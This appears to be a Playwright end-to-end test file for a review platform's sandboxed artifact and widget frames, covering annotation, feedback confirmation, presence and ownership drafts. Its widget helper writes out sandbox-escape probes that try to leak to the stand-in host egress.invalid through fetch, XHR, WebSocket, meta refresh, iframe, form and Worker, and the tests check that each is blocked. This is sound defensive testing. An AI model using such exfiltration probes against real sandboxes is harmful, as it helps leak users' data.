import { createHash, randomUUID } from "node:crypto";

import { expect, test } from "@playwright/test";

import {
  authHeaders,
  collectPageErrors,
  createOrganization,
  createReviewFeedback,
  establishMembership,
  expectNoPageErrors,
  loginAs,
  publishStaticShiplet,
  testUser,
} from "./helpers";

type PortableFile = {
  path: string;
  mediaType: string;
  encoding: "utf8" | "base64";
  content: string;
  sha256: string;
  size: number;
};

function utf8PortableFile(
  path: string,
  content: string,
  mediaType: string,
): PortableFile {
  return {
    path,
    mediaType,
    encoding: "utf8",
    content,
    sha256: createHash("sha256").update(content).digest("hex"),
    size: Buffer.byteLength(content),
  };
}

async function promoteCustomWidget(
  request: Parameters<typeof createOrganization>[0],
  user: ReturnType<typeof testUser>,
  projectId: string,
  comment: string,
  widgetOverride?: { html?: string; script?: string },
) {
  const headers = { ...authHeaders(user), Origin: "http://localhost:8787" };
  const activeResponse = await request.get(
    `/api/shiplets/${projectId}/package`,
    {
      headers,
    },
  );
  expect(activeResponse.ok(), await activeResponse.text()).toBe(true);
  const active = (await activeResponse.json()) as {
    revision: { id: string };
    package: { files: PortableFile[] };
  };
  const forkResponse = await request.post(`/api/shiplets/${projectId}/drafts`, {
    headers,
    data: { fromRevisionId: active.revision.id },
  });
  expect(forkResponse.ok(), await forkResponse.text()).toBe(true);
  const { draft } = (await forkResponse.json()) as {
    draft: { id: string; version: number };
  };
  const draftPackageResponse = await request.get(
    `/api/drafts/${draft.id}/package`,
    {
      headers,
    },
  );
  expect(draftPackageResponse.ok(), await draftPackageResponse.text()).toBe(
    true,
  );
  const draftExport = (await draftPackageResponse.json()) as {
    package: { files: PortableFile[] };
  };
  const safeComment = JSON.stringify(comment);
  const widgetHtml =
    widgetOverride?.html ??
    `<!doctype html><html lang="en"><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=https://egress.invalid/meta-leak"><iframe srcdoc="&lt;script&gt;location.href='https://egress.invalid/srcdoc-leak'&lt;/script&gt;"></iframe><form action="https://egress.invalid/form-leak"><button id="request" type="submit">Request widget feedback</button></form><p id="state">Waiting for trusted host</p><p id="authority">Checking ambient authority</p><script src="./widget.js"></script></html>`;
  const widgetScript =
    widgetOverride?.script ??
    `
shipletWidget.text("#state", "Connected without credentials");
shipletWidget.on("#request", "click", () => {
  shipletWidget.request("feedback.create", { comment: ${safeComment} });
});
try { location.href = "https://egress.invalid/navigation-leak"; } catch {}
try { fetch("https://egress.invalid/fetch-leak").catch(() => {}); } catch {}
try { const xhr = new globalThis["XMLHttpRequest"](); xhr.open("GET", "https://egress.invalid/xhr-leak"); xhr.send(); } catch {}
try { new globalThis["WebSocket"]("wss://egress.invalid/socket-leak"); } catch {}
try { new globalThis["EventSource"]("https://egress.invalid/events-leak"); } catch {}
try { new globalThis["Worker"]("https://egress.invalid/worker-leak.js"); } catch {}
try { globalThis["importScripts"]("https://egress.invalid/import-leak.js"); } catch {}
Promise.all([
  new Promise((resolve) => {
    try { const request = indexedDB.open("shiplet-ambient-probe"); request.onerror = () => resolve("indexeddb=blocked"); request.onsuccess = () => { request.result.close(); resolve("indexeddb=open"); }; }
    catch { resolve("indexeddb=blocked"); }
  }),
  Promise.resolve().then(async () => { try { await caches.open("shiplet-ambient-probe"); return "cache=open"; } catch { return "cache=blocked"; } }),
  Promise.resolve().then(async () => { try { await navigator.locks.request("shiplet-ambient-probe", () => undefined); return "locks=open"; } catch { return "locks=blocked"; } }),
  Promise.resolve().then(() => { try { const channel = new BroadcastChannel("shiplet-ambient-probe"); channel.close(); return "broadcast=open"; } catch { return "broadcast=blocked"; } }),
  Promise.resolve().then(async () => {
    try {
      const Stream = globalThis["WebSocketStream"];
      if (typeof Stream !== "function") return "websocketstream=absent";
      const stream = new Stream("wss://egress.invalid/stream-leak");
      await stream.opened;
      return "websocketstream=open";
    } catch { return "websocketstream=blocked"; }
  }),
  Promise.resolve(typeof globalThis["RTCPeerConnection"] === "undefined" ? "rtc=absent" : "rtc=open"),
]).then((results) => shipletWidget.text("#authority", results.join(",")));
`;
  const files = draftExport.package.files;
  const widgetIndex = files.findIndex(
    (file) => file.path === "widget/index.html",
  );
  const replacement = utf8PortableFile(
    "widget/index.html",
    widgetHtml,
    "text/html; charset=utf-8",
  );
  if (widgetIndex >= 0) files[widgetIndex] = replacement;
  else files.push(replacement);
  const widgetScriptIndex = files.findIndex(
    (file) => file.path === "widget/widget.js",
  );
  const scriptFile = utf8PortableFile(
    "widget/widget.js",
    widgetScript,
    "text/javascript; charset=utf-8",
  );
  if (widgetScriptIndex >= 0) files[widgetScriptIndex] = scriptFile;
  else files.push(scriptFile);
  const updateResponse = await request.put(`/api/drafts/${draft.id}/package`, {
    headers: { ...headers, "If-Match": String(draft.version) },
    data: { package: draftExport.package, expectedVersion: draft.version },
  });
  expect(updateResponse.ok(), await updateResponse.text()).toBe(true);
  const updated = (await updateResponse.json()) as {
    draft: { version: number };
  };
  const validationResponse = await request.post(
    `/api/drafts/${draft.id}/validate`,
    {
      headers,
      data: { expectedVersion: updated.draft.version },
    },
  );
  expect(validationResponse.ok(), await validationResponse.text()).toBe(true);
  const validation = (await validationResponse.json()) as {
    validation: { revisionId: string; ok: boolean };
  };
  expect(validation.validation.ok).toBe(true);
  const promoteResponse = await request.post(
    `/api/drafts/${draft.id}/promote`,
    {
      headers: {
        ...headers,
        "idempotency-key": `widget-promote-${randomUUID()}`,
      },
      data: { expectedActiveRevisionId: active.revision.id, approval: true },
    },
  );
  expect(promoteResponse.ok(), await promoteResponse.text()).toBe(true);
  return validation.validation.revisionId;
}

test.describe("trusted review host", () => {
  test("executes valid inline artifact JavaScript inside the opaque review sandbox", async ({
    page,
    request,
  }) => {
    const user = testUser("trusted-inline-artifact");
    const organization = await createOrganization(request, user);
    const published = await publishStaticShiplet(
      request,
      user,
      organization.id,
      {
        name: `Trusted inline artifact ${Date.now()}`,
        html: `<!doctype html><html><body><p id="inline-status">waiting</p><script>document.querySelector("#inline-status").textContent = "inline artifact executed"; document.body.dataset.inlineArtifact = "executed";</script></body></html>`,
      },
    );
    await loginAs(page, user);

    await page.goto(`/${published.project.subdomain}`, {
      waitUntil: "domcontentloaded",
    });

    const artifact = page.frameLocator("[data-shiplet-artifact-frame]");
    await expect(artifact.locator("#inline-status")).toHaveText(
      "inline artifact executed",
    );
    await expect(artifact.locator("body")).toHaveAttribute(
      "data-inline-artifact",
      "executed",
    );
  });

  test("opens a generated no-index asset inside the existing artifact frame", async ({
    page,
    request,
  }) => {
    const user = testUser("trusted-no-index-artifact");
    const organization = await createOrganization(request, user);
    const name = `Trusted no-index artifact ${Date.now()}`;
    const subdomain = `trusted-no-index-${randomUUID().slice(0, 8)}`;
    const content =
      "No-index asset rendered inside the trusted artifact frame.";
    const publishResponse = await request.post("/projects", {
      headers: {
        ...authHeaders(user),
        "Content-Type": "application/json",
        Origin: "http://localhost:8787",
      },
      data: {
        name,
        organization_id: organization.id,
        subdomain,
        visibility: "organization",
        assets: [
          {
            path: "notes/review.txt",
            content: Buffer.from(content).toString("base64"),
            size: Buffer.byteLength(content),
          },
        ],
      },
    });
    expect(publishResponse.ok(), await publishResponse.text()).toBe(true);
    await loginAs(page, user);

    await page.goto(`/${subdomain}`, { waitUntil: "domcontentloaded" });
    const artifact = page.frameLocator("[data-shiplet-artifact-frame]");
    const openFile = artifact.getByRole("link", { name: "Open file" }).first();
    await expect(openFile).not.toHaveAttribute("target", "_blank");
    await page.getByRole("button", { name: "Close review panel" }).click();
    await openFile.click();
    await expect(artifact.getByText(content)).toBeVisible();
  });

  test("preserves exact tenant provenance without leaking its review path to confirmation", async ({
    context,
    page,
  }) => {
    const tenantOrigin = "http://tenant.localhost:8787";
    const controlOrigin = "http://control.localhost:8787";
    const tenantReviewUrl = `${tenantOrigin}/review/path?panel=review`;
    await page.route(`${tenantOrigin}/**`, async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "text/html",
        headers: { "referrer-policy": "strict-origin" },
        body: `<!doctype html><title>Tenant review</title><form method="post" action="${controlOrigin}/review/confirm" target="_blank" rel="noopener"><button type="submit">Open trusted confirmation</button></form>`,
      });
    });

    let confirmationHeaders: Record<string, string> = {};
    await context.route(`${controlOrigin}/review/confirm`, async (route) => {
      confirmationHeaders = route.request().headers();
      await route.fulfill({
        status: 200,
        contentType: "text/html",
        body: "<!doctype html><title>Tenant confirmation received</title><h1>Tenant confirmation received</h1>",
      });
    });

    await page.goto(tenantReviewUrl, { waitUntil: "domcontentloaded" });
    const popupPromise = page.waitForEvent("popup");
    await page
      .getByRole("button", { name: "Open trusted confirmation" })
      .click();
    const confirmation = await popupPromise;
    await expect(
      confirmation.getByRole("heading", {
        name: "Tenant confirmation received",
      }),
    ).toBeVisible();

    expect(confirmationHeaders?.origin).toBe(tenantOrigin);
    expect(confirmationHeaders?.referer).toBe(`${tenantOrigin}/`);
    expect(confirmationHeaders?.referer).not.toContain("/review/path");
    expect(confirmationHeaders?.referer).not.toContain("panel=review");
    expect(await confirmation.evaluate(() => window.opener === null)).toBe(
      true,
    );
  });

  test("selects artifact context and creates human-attributed feedback through secure confirmation", async ({
    page,
    request,
  }) => {
    const user = testUser("trusted-capture");
    const errors = collectPageErrors(page);
    const organization = await createOrganization(request, user);
    const published = await publishStaticShiplet(
      request,
      user,
      organization.id,
      {
        name: `Trusted capture ${Date.now()}`,
        html: `<!doctype html><html><head><title>Trusted capture</title></head><body><main><h1 id="hero" style="margin-top:120px">Portable Shiplets</h1><p>Capture this artifact without platform authority.</p><div style="height:1800px" aria-hidden="true"></div></main></body></html>`,
      },
    );
    const comment = `Trusted context ${Date.now()}`;
    await loginAs(page, user);

    await page.goto(`/${published.project.subdomain}`, {
      waitUntil: "domcontentloaded",
    });
    await expect(
      page.locator("[data-shiplet-trusted-review-host='v1']"),
    ).toBeVisible();
    const artifact = page.frameLocator("[data-shiplet-artifact-frame]");
    await expect(
      artifact.getByRole("heading", { name: "Portable Shiplets" }),
    ).toBeVisible();
    await expect(
      page.getByRole("button", { name: /Annotate revision_/ }),
    ).toBeVisible();

    await page.getByRole("button", { name: /Annotate revision_/ }).click();
    await artifact.getByRole("heading", { name: "Portable Shiplets" }).click();
    await expect(page.locator(".shiplet-review-target")).toContainText("#hero");
    await page
      .getByRole("button", {
        name: "Show annotation details and target properties",
      })
      .click();
    await page.getByRole("button", { name: "Markup screenshot" }).click();
    const annotationCanvas = page.locator("[data-shiplet-annotation-canvas]");
    await expect(annotationCanvas).toBeVisible();
    const annotationBounds = await annotationCanvas.boundingBox();
    expect(annotationBounds).toBeTruthy();
    if (!annotationBounds) return;
    await page.mouse.move(annotationBounds.x + 120, annotationBounds.y + 140);
    await page.mouse.down();
    await page.mouse.move(annotationBounds.x + 220, annotationBounds.y + 200, {
      steps: 5,
    });
    await page.mouse.up();
    await page.getByRole("button", { name: "Done drawing" }).click();
    await expect(annotationCanvas).toBeVisible();
    await expect(
      page.locator(".shiplet-review-annotation-editor"),
    ).toHaveAttribute("data-drawing", "false");
    const drawnBoundsBeforeScroll = await annotationCanvas.evaluate((node) => {
      const canvas = node as HTMLCanvasElement;
      const context = canvas.getContext("2d");
      if (!context) return null;
      const pixels = context.getImageData(0, 0, canvas.width, canvas.height).data;
      let minimumY = canvas.height;
      let maximumY = -1;
      for (let y = 0; y < canvas.height; y += 1) {
        for (let x = 0; x < canvas.width; x += 1) {
          const offset = (y * canvas.width + x) * 4;
          if (pixels[offset + 3] > 0) {
            minimumY = Math.min(minimumY, y);
            maximumY = Math.max(maximumY, y);
          }
        }
      }
      return maximumY >= 0 ? { minimumY, maximumY } : null;
    });
    expect(drawnBoundsBeforeScroll).toBeTruthy();
    const targetPin = page.locator("[data-shiplet-annotation-target-pin]");
    const composer = page.locator("#shiplet-annotation-composer");
    const pinTopBeforeScroll = await targetPin.evaluate((node) =>
      Number.parseFloat((node as HTMLElement).style.top),
    );
    const composerTopBeforeScroll = await composer.evaluate((node) =>
      Number.parseFloat((node as HTMLElement).style.top),
    );

    await artifact.locator("html").evaluate(() => window.scrollBy(0, 60));
    await expect
      .poll(() =>
        targetPin.evaluate((node) =>
          Number.parseFloat((node as HTMLElement).style.top),
        ),
      )
      .toBeLessThan(pinTopBeforeScroll - 50);
    await expect
      .poll(() =>
        composer.evaluate((node) =>
          Number.parseFloat((node as HTMLElement).style.top),
        ),
      )
      .toBeLessThan(composerTopBeforeScroll - 50);
    const drawnBoundsAfterScroll = await annotationCanvas.evaluate((node) => {
      const canvas = node as HTMLCanvasElement;
      const context = canvas.getContext("2d");
      if (!context) return null;
      const pixels = context.getImageData(0, 0, canvas.width, canvas.height).data;
      let minimumY = canvas.height;
      let maximumY = -1;
      for (let y = 0; y < canvas.height; y += 1) {
        for (let x = 0; x < canvas.width; x += 1) {
          const offset = (y * canvas.width + x) * 4;
          if (pixels[offset + 3] > 0) {
            minimumY = Math.min(minimumY, y);
            maximumY = Math.max(maximumY, y);
          }
        }
      }
      return maximumY >= 0 ? { minimumY, maximumY } : null;
    });
    expect(drawnBoundsAfterScroll).toBeTruthy();
    expect(drawnBoundsAfterScroll!.minimumY).toBeLessThan(
      drawnBoundsBeforeScroll!.minimumY - 50,
    );
    await page.locator("#shiplet-review-comment").fill(comment);

    const popupPromise = page.waitForEvent("popup");
    await page
      .getByRole("button", { name: "Send annotation", exact: true })
      .click();
    await expect(annotationCanvas).toHaveCount(0);
    const confirmation = await popupPromise;
    await confirmation.waitForLoadState("domcontentloaded");
    await expect(
      confirmation.getByRole("heading", { name: "Confirm feedback" }),
    ).toBeVisible();
    await expect(confirmation.getByText(comment)).toBeVisible();
    await confirmation
      .getByRole("button", { name: "Confirm and send feedback" })
      .click();
    await expect(
      confirmation.getByRole("heading", { name: "Feedback sent" }),
    ).toBeVisible();

    await page.locator(".shiplet-review-comments-launcher").click();
    await page.getByLabel("Review options").click();
    await page.getByRole("button", { name: "Refresh" }).click();
    await expect(page.locator(".shiplet-review-list")).toContainText(comment);

    const feedbackResponse = await request.get(
      `/api/projects/${encodeURIComponent(published.project.id)}/review-feedback`,
      {
        headers: {
          ...authHeaders(user),
          Origin: "http://localhost:8787",
        },
      },
    );
    expect(feedbackResponse.ok()).toBe(true);
    const body = (await feedbackResponse.json()) as {
      feedback: Array<{
        comment: string;
        screenshot_url: string | null;
        screenshot_mode: string;
        selected_element: { selector?: string } | null;
      }>;
    };
    const saved = body.feedback.find((item) => item.comment === comment);
    expect(saved).toMatchObject({ screenshot_mode: "element" });
    expect(saved?.selected_element?.selector).toContain("hero");
    expect(saved?.screenshot_url).toBeTruthy();
    const markupPixels = await page.evaluate(async (dataUrl) => {
      const image = new Image();
      await new Promise<void>((resolve, reject) => {
        image.onload = () => resolve();
        image.onerror = () => reject(new Error("Saved screenshot did not load"));
        image.src = dataUrl;
      });
      const canvas = document.createElement("canvas");
      canvas.width = image.naturalWidth;
      canvas.height = image.naturalHeight;
      const context = canvas.getContext("2d");
      if (!context) return 0;
      context.drawImage(image, 0, 0);
      const pixels = context.getImageData(0, 0, canvas.width, canvas.height).data;
      let count = 0;
      for (let offset = 0; offset < pixels.length; offset += 4) {
        if (
          pixels[offset] > 180 &&
          pixels[offset + 1] < 100 &&
          pixels[offset + 2] < 140 &&
          pixels[offset + 3] > 0
        ) {
          count += 1;
        }
      }
      return count;
    }, saved!.screenshot_url!);
    expect(markupPixels).toBeGreaterThan(100);
    await expectNoPageErrors(errors);
  });

  test("terminates a stalled widget turn while trusted review controls remain responsive", async ({
    page,
    request,
  }) => {
    const owner = testUser("trusted-widget-timeout");
    const errors = collectPageErrors(page);
    const organization = await createOrganization(request, owner);
    const published = await publishStaticShiplet(
      request,
      owner,
      organization.id,
      {
        name: `Trusted widget timeout ${Date.now()}`,
      },
    );
    await promoteCustomWidget(
      request,
      owner,
      published.project.id,
      "This operation must never be requested",
      {
        html: '<!doctype html><p id="state">Starting isolated widget</p><button id="lock" type="button">Lock widget</button><script src="./widget.js"></script>',
        script:
          'shipletWidget.text("#state", "Worker ready"); shipletWidget.on("#lock", "click", () => { while (true) {} });',
      },
    );
    await loginAs(page, owner);
    await page.goto(`/${published.project.subdomain}`, {
      waitUntil: "domcontentloaded",
    });

    const widget = page.frameLocator("[data-shiplet-widget-frame]");
    await expect(widget.locator("#state")).toHaveText("Worker ready");
    await widget.getByRole("button", { name: "Lock widget" }).click();
    await expect(widget.getByRole("status")).toHaveText(
      "Custom widget exceeded its execution limit.",
      { timeout: 5_000 },
    );
    const restart = widget.getByRole("button", { name: "Restart widget" });
    await expect(restart).toBeVisible();
    await restart.click();
    await expect(widget.locator("#state")).toHaveText("Worker ready");
    await expect(restart).toBeHidden();
    await page.getByRole("button", { name: "Refresh" }).click();
    await expect(page.locator(".shiplet-review-status")).toContainText(
      /No comments yet|Review loaded/,
    );
    await expectNoPageErrors(errors);
  });
});

test.describe("ownership draft editor", () => {
  test("edits an isolated widget package before validation and leaves the active revision unchanged", async ({
    page,
    request,
  }) => {
    const user = testUser("ownership-editor");
    const organization = await createOrganization(request, user);
    const published = await publishStaticShiplet(
      request,
      user,
      organization.id,
      {
        name: `Ownership editor ${Date.now()}`,
      },
    );
    const headers = { ...authHeaders(user), Origin: "http://localhost:8787" };
    const activeBeforeResponse = await request.get(
      `/api/shiplets/${published.project.id}/package`,
      { headers },
    );
    const activeBefore = (await activeBeforeResponse.json()) as {
      revision: { id: string };
    };
    await loginAs(page, user);
    await page.goto(`/shiplets/${published.project.id}/ownership`, {
      waitUntil: "domcontentloaded",
    });
    await page.getByRole("button", { name: "Create draft" }).click();
    await expect(
      page.getByRole("button", { name: /Continue Draft/ }),
    ).toBeVisible();
    await page.getByRole("button", { name: /Continue Draft/ }).click();
    await page
      .getByText("Advanced: edit raw package JSON", { exact: true })
      .click();
    const editor = page.getByRole("textbox", { name: "Draft package JSON" });
    await expect(editor).toBeVisible();
    const packageValue = JSON.parse(await editor.inputValue()) as {
      files: PortableFile[];
    };
    const widget = packageValue.files.find(
      (file) => file.path === "widget/index.html",
    );
    expect(widget).toBeTruthy();
    if (!widget) return;
    widget.content =
      '<!doctype html><html lang="en"><body><p data-widget-marker="ownership-editor">Edited in the trusted ownership UI</p></body></html>';
    widget.encoding = "utf8";
    widget.size = Buffer.byteLength(widget.content);
    widget.sha256 = createHash("sha256").update(widget.content).digest("hex");
    await editor.fill(JSON.stringify(packageValue, null, 2));
    await page.getByRole("button", { name: "Save draft package" }).click();
    await expect(
      page.getByRole("button", { name: /Validate Draft/ }),
    ).toBeVisible();

    const activeAfterSaveResponse = await request.get(
      `/api/shiplets/${published.project.id}/package`,
      { headers },
    );
    const activeAfterSave = (await activeAfterSaveResponse.json()) as {
      revision: { id: string };
    };
    expect(activeAfterSave.revision.id).toBe(activeBefore.revision.id);
  });
});

test.describe("trusted review collaboration controls", () => {
  test("updates status, replies, and watch state from the trusted document", async ({
    page,
    request,
  }) => {
    const user = testUser("trusted-thread");
    const organization = await createOrganization(request, user);
    const published = await publishStaticShiplet(
      request,
      user,
      organization.id,
      {
        name: `Trusted thread ${Date.now()}`,
      },
    );
    const comment = `Thread root ${Date.now()}`;
    const reply = `Trusted reply ${Date.now()}`;
    const created = await createReviewFeedback(
      request,
      user,
      published.project,
      {
        comment,
      },
    );
    await loginAs(page, user);
    await page.goto(`/${published.project.subdomain}`, {
      waitUntil: "domcontentloaded",
    });

    await expect(page.locator(".shiplet-review-list")).toContainText(comment);
    const status = page.getByLabel(`Status ${created.feedback.ticket_label}`);
    const observedPosts: string[] = [];
    page.on("request", (request) => {
      if (request.method() === "POST")
        observedPosts.push(new URL(request.url()).pathname);
    });
    await status.selectOption("In Progress");
    const statusButton = page.getByRole("button", {
      name: `Update status for ${created.feedback.ticket_label}`,
    });
    await statusButton.evaluate((button) => {
      button.addEventListener("click", (event) => {
        button.setAttribute("data-playwright-trusted", String(event.isTrusted));
      });
    });
    await statusButton.click();
    await expect(statusButton).toHaveAttribute(
      "data-playwright-trusted",
      "true",
    );
    await expect
      .poll(() => observedPosts, { timeout: 2_000 })
      .toContain(
        `/${encodeURIComponent(published.project.subdomain)}/__shiplet/review/feedback/${encodeURIComponent(created.feedback.id)}/status`,
      );
    await expect(status).toHaveValue("In Progress");
    await page
      .getByLabel(`Reply text for ${created.feedback.ticket_label}`)
      .fill(reply);
    const replyResponse = page.waitForResponse(
      (response) =>
        response.request().method() === "POST" &&
        response
          .url()
          .endsWith(
            `/${encodeURIComponent(published.project.subdomain)}/__shiplet/review/feedback/${encodeURIComponent(created.feedback.id)}/replies`,
          ),
    );
    await page
      .getByRole("button", {
        name: `Reply to ${created.feedback.ticket_label}`,
      })
      .click();
    expect((await replyResponse).ok()).toBe(true);
    await expect(page.locator(".shiplet-review-list")).toContainText(reply);

    const watch = page.getByRole("button", { name: "Watching" });
    await expect(watch).toBeVisible();
    await watch.click();
    await expect(
      page.getByRole("button", { name: "Watch artifact" }),
    ).toBeVisible();
  });

  test("shows live reviewers only in the trusted host document", async ({
    browser,
    page,
    request,
  }) => {
    const firstUser = testUser("trusted-presence-a");
    const secondUser = testUser("trusted-presence-b");
    const organization = await createOrganization(request, firstUser);
    const firstAvatar = await request.post("/api/me/avatar", {
      headers: { ...authHeaders(firstUser), Origin: "http://localhost:8787" },
      data: { avatarPreset: "aurora-grid" },
    });
    expect(firstAvatar.ok(), await firstAvatar.text()).toBe(true);
    const secondAvatar = await request.post("/api/me/avatar", {
      headers: { ...authHeaders(secondUser), Origin: "http://localhost:8787" },
      data: { avatarPreset: "violet-signal" },
    });
    expect(secondAvatar.ok(), await secondAvatar.text()).toBe(true);
    const published = await publishStaticShiplet(
      request,
      firstUser,
      organization.id,
      {
        name: `Trusted presence ${Date.now()}`,
        visibility: "public",
      },
    );
    await loginAs(page, firstUser);
    await page.goto(`/${published.project.subdomain}`, {
      waitUntil: "domcontentloaded",
    });

    const secondContext = await browser.newContext();
    const secondPage = await secondContext.newPage();
    try {
      await loginAs(secondPage, secondUser);
      await secondPage.goto(`/${published.project.subdomain}`, {
        waitUntil: "domcontentloaded",
      });
      await expect(page.locator(".shiplet-review-presence-avatar")).toHaveCount(
        2,
      );
      await expect(
        page.locator(
          `[data-shiplet-presence-viewer="${firstUser.id}"]`,
        ),
      ).toHaveCSS("background-position", "0% 0%");
      await expect(
        page.locator(
          `[data-shiplet-presence-viewer="${secondUser.id}"]`,
        ),
      ).toHaveCSS("background-position", "33.3333% 50%");
      await expect(
        page.locator(
          `[data-shiplet-presence-viewer="${secondUser.id}"]`,
        ),
      ).toHaveCSS("background-size", "400% 300%");
      await expect(
        page
          .frameLocator("[data-shiplet-artifact-frame]")
          .locator(".shiplet-review-presence-avatar"),
      ).toHaveCount(0);
      await secondContext.close();
      await expect(page.locator(".shiplet-review-presence-avatar")).toHaveCount(
        1,
      );
    } finally {
      await secondContext.close().catch(() => undefined);
    }
  });

  test("creates a canonical inbox notification from a trusted-host mention", async ({
    page,
    request,
  }) => {
    const owner = testUser("trusted-mention-owner");
    const reviewer = testUser("trusted-mention-reviewer");
    const organization = await createOrganization(request, owner);
    await establishMembership(request, organization.id, reviewer);
    const published = await publishStaticShiplet(
      request,
      owner,
      organization.id,
      {
        name: `Trusted mention ${Date.now()}`,
        html: "<!doctype html><title>Trusted mention</title><h1 style='margin-top:120px'>Trusted mention target</h1>",
      },
    );
    const comment = `Mention from trusted host ${Date.now()}`;
    await loginAs(page, reviewer);
    await page.goto(`/${published.project.subdomain}`, {
      waitUntil: "domcontentloaded",
    });

    await page.getByRole("button", { name: /Annotate revision_/ }).click();
    await page
      .frameLocator("[data-shiplet-artifact-frame]")
      .getByRole("heading")
      .first()
      .click();
    await page
      .getByRole("button", {
        name: "Show annotation details and target properties",
      })
      .click();
    const mentionSelect = page.getByLabel("Mention reviewers");
    await expect(mentionSelect).toContainText(owner.email);
    await page.locator(".shiplet-review-mentions summary").click();
    await mentionSelect.selectOption(owner.id);
    await page.locator("#shiplet-review-comment").fill(comment);
    const popupPromise = page.waitForEvent("popup");
    await page
      .getByRole("button", { name: "Send annotation", exact: true })
      .click();
    const confirmation = await popupPromise;
    await confirmation.waitForLoadState("domcontentloaded");
    await confirmation
      .getByRole("button", { name: "Confirm and send feedback" })
      .click();
    await expect(
      confirmation.getByRole("heading", { name: "Feedback sent" }),
    ).toBeVisible();

    await loginAs(page, owner);
    await page.goto("/inbox", { waitUntil: "networkidle" });
    await expect(page.locator("#notificationRows")).toContainText(
      "mentioned you",
    );
    await expect(page.locator("#notificationRows")).toContainText(
      published.project.name,
    );
  });

  test("loads an active revision widget in a non-navigable compartment and requires trusted approval", async ({
    context,
    page,
    request,
  }) => {
    const owner = testUser("trusted-custom-widget");
    const widgetDiagnostics: string[] = [];
    const egressRequests: string[] = [];
    await context.route("https://egress.invalid/**", async (route) => {
      egressRequests.push(route.request().url());
      await route.abort();
    });
    page.on("requestfailed", (request) => {
      if (new URL(request.url()).pathname.endsWith("/widget.js")) {
        widgetDiagnostics.push(
          `requestfailed:${request.failure()?.errorText || "unknown"}`,
        );
      }
    });
    page.on("console", (message) => {
      const value = message.text();
      if (/content security policy|refused to load/i.test(value)) {
        widgetDiagnostics.push("csp-script-block");
      }
    });
    page.on("websocket", (socket) => {
      if (new URL(socket.url()).hostname === "egress.invalid") {
        egressRequests.push(socket.url());
      }
    });
    const organization = await createOrganization(request, owner);
    const published = await publishStaticShiplet(
      request,
      owner,
      organization.id,
      {
        name: `Trusted custom widget ${Date.now()}`,
      },
    );
    const comment = `Custom widget proposal ${Date.now()}`;
    const revisionId = await promoteCustomWidget(
      request,
      owner,
      published.project.id,
      comment,
    );
    await loginAs(page, owner);
    await page.goto(`/${published.project.subdomain}`, {
      waitUntil: "domcontentloaded",
    });

    const widget = page.frameLocator("[data-shiplet-widget-frame]");
    const widgetSrc = await page
      .locator("[data-shiplet-widget-frame]")
      .getAttribute("src");
    expect(widgetSrc).toBeTruthy();
    const widgetScriptUrl = new URL(
      "widget.js",
      new URL(widgetSrc!, page.url()),
    );
    const widgetScriptResponse = await request.get(widgetScriptUrl.toString(), {
      headers: { ...authHeaders(owner), Origin: "http://localhost:8787" },
    });
    expect(widgetScriptResponse.ok(), await widgetScriptResponse.text()).toBe(
      true,
    );
    expect(widgetScriptResponse.headers()["content-type"]).toContain(
      "text/javascript",
    );
    await page.waitForTimeout(1_000);
    expect({
      state: await widget.locator("#state").textContent(),
      widgetDiagnostics,
      egressRequests,
    }).toEqual({
      state: "Connected without credentials",
      widgetDiagnostics: [],
      egressRequests: [],
    });
    await expect(widget.locator("#authority")).toHaveText(
      "indexeddb=blocked,cache=blocked,locks=blocked,broadcast=blocked,websocketstream=absent,rtc=absent",
    );
    await expect(widget.locator("meta[http-equiv='refresh']")).toHaveCount(0);
    await expect(widget.locator("iframe")).toHaveCount(0);
    await expect(widget.locator("form")).not.toHaveAttribute("action");
    await widget
      .getByRole("button", { name: "Request widget feedback" })
      .click();
    const confirmationPanel = page.locator(
      "[data-shiplet-widget-confirmation='v1']",
    );
    await expect(confirmationPanel).toContainText(comment);

    const widgetFrame = page.locator("[data-shiplet-widget-frame]");
    await widgetFrame.evaluate((frame) => {
      (frame as HTMLIFrameElement).src = "about:blank";
    });
    await expect(confirmationPanel).toBeHidden();
    await widgetFrame.evaluate((frame, src) => {
      (frame as HTMLIFrameElement).src = String(src);
    }, widgetSrc);
    await expect(widget.locator("#state")).toHaveText(
      "Connected without credentials",
    );
    await widget
      .getByRole("button", { name: "Request widget feedback" })
      .click();
    await expect(confirmationPanel).toContainText(comment);

    const beforeApproval = await request.get(
      `/api/projects/${encodeURIComponent(published.project.id)}/review-feedback`,
      { headers: { ...authHeaders(owner), Origin: "http://localhost:8787" } },
    );
    expect(beforeApproval.ok()).toBe(true);
    expect(
      (
        (await beforeApproval.json()) as {
          feedback: Array<{ comment: string }>;
        }
      ).feedback,
    ).not.toEqual(
      expect.arrayContaining([expect.objectContaining({ comment })]),
    );

    const popupPromise = page.waitForEvent("popup");
    await confirmationPanel.locator("[data-shiplet-widget-confirm]").click();
    const confirmation = await popupPromise;
    await confirmation.waitForLoadState("domcontentloaded");
    await confirmation
      .getByRole("button", { name: "Confirm and send feedback" })
      .click();
    await expect(
      confirmation.getByRole("heading", { name: "Feedback sent" }),
    ).toBeVisible();
    const presenceBounds = await page
      .locator(".shiplet-review-presence")
      .boundingBox();
    const refreshBounds = await page
      .getByRole("button", { name: "Refresh" })
      .boundingBox();
    expect(presenceBounds).toBeTruthy();
    expect(refreshBounds).toBeTruthy();
    if (presenceBounds && refreshBounds) {
      expect(
        presenceBounds.x < refreshBounds.x + refreshBounds.width &&
          presenceBounds.x + presenceBounds.width > refreshBounds.x &&
          presenceBounds.y < refreshBounds.y + refreshBounds.height &&
          presenceBounds.y + presenceBounds.height > refreshBounds.y,
      ).toBe(false);
    }
    await page.getByRole("button", { name: "Refresh" }).click();
    await expect(page.locator(".shiplet-review-list")).toContainText(comment);
    await expect(page.locator("html")).toHaveAttribute(
      "data-revision-id",
      revisionId,
    );
  });
});
